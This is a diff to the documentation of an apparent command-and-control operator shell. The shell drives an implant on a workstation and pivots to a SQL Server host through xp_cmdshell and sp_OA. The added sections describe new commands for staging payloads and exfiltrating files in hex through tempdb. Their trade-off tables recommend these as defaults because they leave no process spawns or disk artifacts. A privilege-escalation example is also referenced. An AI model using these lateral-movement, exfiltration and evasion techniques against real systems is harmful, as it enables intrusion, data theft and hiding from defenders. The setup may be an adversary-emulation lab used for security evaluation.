@@ -7,7 +7,7 @@
 `controlShell` wraps the evalsC2client REST API with a persistent interactive prompt so operators do not need to craft JSON task packets or manage session GUIDs manually. Every built-in command maps to one of three transports:
 
 - **Direct C2** (`sessions`, `use`, bare commands, `get`, `put`, `kill`): JSON task packets posted to the ToneShell implant on WS01 via `POST /api/v1.0/session/<guid>/task`, output polled at `GET /api/v1.0/task/<task_guid>`.
-- **xpshell tunnel** (`xpinit`, `xpshell`, `xpstage`, `xpexfil`): chains of `sqlcmd` EXEC tasks on WS01 that reach IIS01 through `sp_OA`/`xp_cmdshell`. Each command stages a temporary `.bat` or `.ps1` to `C:\ProgramData\`, executes it, reads output, then deletes. `xpstage` transfers AES-256-CBC encrypted binaries entirely through `tempdb`; `xpexfil` reverses the channel to pull files out in encrypted chunks.
+- **xpshell tunnel** (`xpinit`, `xpshell`, `xpstage`, `xpstage-hex`, `xpexfil`): chains of `sqlcmd` EXEC tasks on WS01 that reach IIS01 through `sp_OA`/`xp_cmdshell`. Each command stages a temporary `.bat` or `.ps1` to `C:\ProgramData\`, executes it, reads output, then deletes. `xpstage` transfers AES-256-CBC encrypted binaries entirely through `tempdb`; `xpstage-hex` is the improved variant that decodes+writes entirely in T-SQL via ADODB.Stream — no process spawn or disk artifact on IIS01. `xpexfil` reverses the channel to pull files out in encrypted chunks.
 - **xpagent tunnel** (`xpagent init`, `xpexec`, `xpexec-bg`, `xpout`, `xpagent kill`): a one-time SQL Server object set (table + AFTER INSERT trigger + Service Broker queue + activation procedure) deployed to IIS01 `tempdb`. Commands are submitted as INSERTs and executed asynchronously by the activated procedure via `xp_cmdshell @variable` — no `.bat`/`.ps1` ever written to disk per command. Reduces per-command MSSQL task count from 4–6 to 2 and eliminates intermediate disk artifacts.
 
 ```
@@ -102,8 +102,35 @@ Must run `xpinit` first to enable `sp_OA` + `xp_cmdshell` on IIS01.
 | `xpinit <host:port> <login> <pass>` | Enable sp_OA + xp_cmdshell on MSSQL target; verify with `whoami` |
 | `xpshell cmd <command>` | Run cmd.exe command on IIS01 via `.bat` staging (4 sqlcmd round-trips) |
 | `xpshell psh <ps_script_content>` | Stage and run PowerShell script on IIS01 via `.ps1` staging (3 sqlcmd round-trips) |
-| `xpstage <payload_name> [--no-encrypt]` | Transfer binary to IIS01 via `tempdb..stg` — AES-256-CBC encrypted, no HTTP from IIS01 |
+| `xpstage <payload_name> [--no-encrypt]` | Transfer binary to IIS01 via `tempdb..stg` — AES-256-CBC encrypted, PowerShell decode on IIS01 |
+| `xpstage-hex <payload_name>` | Transfer binary to IIS01 via hex-encoded `tempdb..stg` — T-SQL ADODB.Stream decode, no process spawn on IIS01 |
 | `xpexfil <remote_path> <local_name> [insert_timeout_s=600] [chunk_mb=10]` | AES-256-CBC exfiltrate file from IIS01 through `tempdb..exfil` in chunks; assembles at C2 |
+| `xpexfil-hex <remote_path> <local_name> [insert_timeout_s=600] [chunk_mb=10]` | Hex exfil via `OPENROWSET(BULK)` + T-SQL hex INSERT — no process spawn on IIS01; C2 Python decode |
+
+`xpstage` vs `xpstage-hex` trade-off:
+
+| | `xpstage` | `xpstage-hex` |
+|---|---|---|
+| Encoding | AES-256-CBC + base64 | hex (no encryption) |
+| Decode on IIS01 | PowerShell (SqlClient loopback + AES decrypt + WriteAllBytes) | T-SQL in-process (variable concat + `CONVERT` + `sp_OA ADODB.Stream`) |
+| Process spawn on IIS01 | `cmd.exe` + `powershell.exe` | none (COM in-process in `sqlservr.exe`) |
+| Disk artifact on IIS01 | `.ps1` file (temporary) | none |
+| SQL file size | smaller (~1.33 chars/byte) | larger (~2 chars/byte) |
+
+Use `xpstage-hex` as the default — it eliminates process spawns and disk artifacts on the target. Use `xpstage` when AES encryption of the transport channel is required or for comparison testing.
+
+`xpexfil` vs `xpexfil-hex` trade-off:
+
+| | `xpexfil` | `xpexfil-hex` |
+|---|---|---|
+| INSERT on IIS01 | N × PowerShell (OpenRead + AES + base64 + SqlClient) | 1 × T-SQL (`OPENROWSET(BULK)` + hex + INSERT all) |
+| Process spawn on IIS01 | N × (`cmd.exe` + `powershell.exe`) | none |
+| Disk artifact on IIS01 | N × `.ps1` (temporary) | none |
+| Extract on WS01 | PowerShell (SqlClient + base64 decode + AES decrypt) | PowerShell (SqlClient + write hex text) |
+| Decode | AES-256-CBC on WS01 | `bytes.fromhex()` on C2 (Python) |
+| Encryption | AES-256-CBC | none (hex only) |
+
+Use `xpexfil-hex` as the default — it eliminates all process spawns on IIS01 and simplifies the extract step. Use `xpexfil` when AES encryption of the exfil channel is required.
 
 ☣️ `xpshell cmd <cmd>` example — EfsPotato privilege escalation (requires `seclogon` running on IIS01):
 
